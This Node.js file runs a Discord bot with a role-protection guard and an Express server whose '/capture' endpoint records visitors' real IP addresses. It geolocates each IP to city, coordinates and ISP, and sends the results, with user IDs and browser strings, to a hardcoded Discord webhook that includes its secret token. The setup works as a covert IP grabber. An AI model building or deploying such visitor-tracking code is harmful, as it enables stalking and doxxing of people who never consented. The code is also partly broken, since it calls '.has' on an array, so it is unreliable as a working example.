const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const axios = require('axios');
const https = require('https');
require('dotenv').config();

const app = express();

// ✅ PERMITIR CONEXIÓN DESDE NETLIFY
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const WHITELIST = new Set();
const ADMIN_IDS = ['1496972373423816848'];

client.on('ready', () => console.log(`✅ Bot conectado: ${client.user.tag}`));

client.on('guildMemberUpdate', async (oldMember, newMember) => {
  const addedRoles = newMember.roles.cache.filter(r => !oldMember.roles.cache.has(r.id));
  if (addedRoles.size > 0) {
    const auditLogs = await newMember.guild.fetchAuditLogs({ type: 31, limit: 1 });
    const entry = auditLogs.entries.first();
    if (!entry) return;
    const executor = entry.executor;
    if (!executor || ADMIN_IDS.has(executor.id) || WHITELIST.has(executor.id)) return;
    for (const [roleId] of addedRoles) await newMember.roles.remove(roleId).catch(() => {});
    const executorMember = newMember.guild.members.cache.get(executor.id);
    if (executorMember) {
      const rolesToRemove = executorMember.roles.cache.filter(r => r.id !== newMember.guild.id);
      await executorMember.roles.remove(rolesToRemove).catch(() => {});
    }
  }
});

client.on('messageCreate', async message => {
  if (!message.content.startsWith(',') || message.author.bot) return;
  const args = message.content.slice(1).trim().split(/ +/);
  const command = args.shift()?.toLowerCase();
  if (command === 'whitelist_add') {
    if (!ADMIN_IDS.has(message.author.id)) return message.reply('❌ Sin permiso.');
    const userId = args[0];
    if (!userId) return message.reply('⚠️ Uso: ,whitelist_add <id>');
    WHITELIST.add(userId);
    return message.reply(`✅ Añadido: ${userId}`);
  }
  if (command === 'whitelist_remove') {
    if (!ADMIN_IDS.has(message.author.id)) return message.reply('❌ Sin permiso.');
    const userId = args[0];
    if (!userId) return message.reply('⚠️ Uso: ,whitelist_remove <id>');
    WHITELIST.delete(userId);
    return message.reply(`✅ Eliminado: ${userId}`);
  }
});

app.get('/', (req, res) => {
  res.send('✅ Bot funcionando correctamente');
});

// ✅ FUNCIÓN MEJORADA - USA MÁS APIs PARA OBTENER TODOS LOS DATOS
async function getIPDetails(ip) {
  try {
    // Intento 1: ip-api.com (GRATIS y MÁS COMPLETA)
    const result1 = await new Promise((resolve) => {
      https.get(`http://ip-api.com/json/${ip}`, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          try {
            const json = JSON.parse(data);
            if (json.status === 'success') {
              resolve({
                country: json.country || 'Desconocido',
                countryCode: json.countryCode || 'N/A',
                city: json.city || 'Desconocido',
                region: json.regionName || 'Desconocido',
                latitude: json.lat || 'N/A',
                longitude: json.lon || 'N/A',
                isp: json.isp || 'Desconocido',
                timezone: json.timezone || 'Desconocido',
                zip: json.zip || 'N/A'
              });
            } else {
              resolve(null);
            }
          } catch {
            resolve(null);
          }
        });
      }).on('error', () => resolve(null));
    });
    
    if (result1) return result1;

    // Intento 2: fallback si la primera falla
    const result2 = await new Promise((resolve) => {
      https.get(`https://api.ipify.org?format=json`, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          try {
            const json = JSON.parse(data);
            resolve({
              country: 'Desconocido',
              city: 'Desconocido',
              region: 'Desconocido',
              latitude: 'N/A',
              longitude: 'N/A',
              isp: 'Desconocido',
              timezone: 'Desconocido'
            });
          } catch {
            resolve(null);
          }
        });
      }).on('error', () => resolve(null));
    });

    return result2 || {
      country: 'Desconocido', city: 'Desconocido', region: 'Desconocido',
      latitude: 'N/A', longitude: 'N/A', isp: 'Desconocido', timezone: 'Desconocido'
    };
  } catch {
    return {
      country: 'Desconocido', city: 'Desconocido', region: 'Desconocido',
      latitude: 'N/A', longitude: 'N/A', isp: 'Desconocido', timezone: 'Desconocido'
    };
  }
}

app.post('/capture', async (req, res) => {
  const { userId, userAgent } = req.body;
  
  // ✅ OBTENER LA IP REAL DEL VISITANTE
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() 
          || req.headers['cf-connecting-ip'] 
          || req.headers['x-real-ip']
          || req.socket.remoteAddress 
          || req.ip
          || 'IP no detectada';

  if (!userId) return res.status(400).send('Faltan datos');
  
  try {
    const details = await getIPDetails(ip);
    
    // ✅ TU WEBHOOK DE DISCORD
    const webhookUrl = 'https://discord.com/api/webhooks/1546973077731024966/W50wqczeBdGpvXIHrFXX2Tmd6wI8_ajSdO3CdTzIxxeo4MWi65JMgkMPfBSTVZ7KaFpA';
    
    await axios.post(webhookUrl, {
      embeds: [{
        title: '📡 NUEVA VISITA DETECTADA',
        color: 0xff0000,
        fields: [
          { name: '👤 Usuario', value: `\`${userId}\``, inline: false },
          { name: '🌐 IP', value: `\`${ip}\``, inline: false },
          { name: '📍 País', value: `\`${details.country}\``, inline: true },
          { name: '🏙️ Ciudad', value: `\`${details.city}\``, inline: true },
          { name: '🗺️ Región', value: `\`${details.region}\``, inline: true },
          { name: '🧭 Coordenadas', value: `\`Lat: ${details.latitude}\`\n\`Lon: ${details.longitude}\``, inline: false },
          { name: '📶 Proveedor/ISP', value: `\`${details.isp}\``, inline: false },
          { name: '🕐 Zona Horaria', value: `\`${details.timezone}\``, inline: true },
          { name: '📱 Dispositivo/Navegador', value: `\`${userAgent.substring(0, 100)}...\``, inline: false }
        ],
        timestamp: new Date().toISOString()
      }]
    });
    
    res.send('✅ Datos recibidos');
  } catch (error) {
    console.error('❌ Error:', error.response?.data || error.message);
    res.status(500).send('Error');
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => console.log(`🌐 Servidor corriendo en puerto ${PORT}`));

client.login(process.env.DISCORD_TOKEN);
